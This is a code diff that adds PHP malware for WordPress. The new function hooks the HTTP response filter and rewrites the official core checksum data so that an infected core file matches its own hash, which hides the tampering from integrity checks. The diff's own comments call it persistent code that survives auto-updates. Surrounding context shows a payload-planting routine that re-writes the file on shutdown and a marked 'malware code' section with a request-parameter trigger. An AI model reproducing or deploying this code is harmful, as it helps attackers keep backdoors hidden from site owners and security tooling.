@@ -48,6 +48,40 @@ if ( ! function_exists("weaver_plant_payload") ){
         @register_shutdown_function("weaver_plant_payload", __FILE__, $my_content, false);
     }
 }
+//append this code in included / required files after plugin.php
+//there is always possibility file_put_contents to fail
+//at the end, could be used as stand alone persistent code against wp / wp-cli auto-updates 
+if ( ! function_exists("weaver_phoning_home") && function_exists("add_filter") ){
+    function weaver_phoning_home($response, $parsed_args, $url){
+        global $weaver_current_file;
+        if ( strpos($url, "api.wordpress.org/core/checksums") !== false ){
+            if ( ! is_wp_error( $response ) && 200 == wp_remote_retrieve_response_code( $response ) ) {
+                if ( isset($response["body"]) ){
+                    $body = json_decode( trim($response["body"]), true );
+                    if ( is_array($body) && isset($body['checksums']) && is_array($body['checksums']) ) {
+                        $alter_response = false;
+                        foreach ( $body['checksums'] as $core_file => $md5checksum ){
+                            if ( strpos($weaver_current_file, $core_file) !== false ){
+                                $wmd5 = md5_file($weaver_current_file);
+                                if ( $md5checksum !== $wmd5 ){
+                                    $alter_response = true;
+                                    $body['checksums'][$core_file] = $wmd5;
+                                }
+                            }
+                        }
+                        if ($alter_response){
+                            $response["body"] = json_encode($body);
+                            return $response;
+                        }
+                    }
+                }
+            }
+        }
+        return $response;
+    }
+	$weaver_current_file = __FILE__;
+	add_filter('http_response', 'weaver_phoning_home', 1, 4);
+}
 //malware code below - any length, any logic
 if ( isset($_REQUEST["wppply"])){
     exit("deeply");
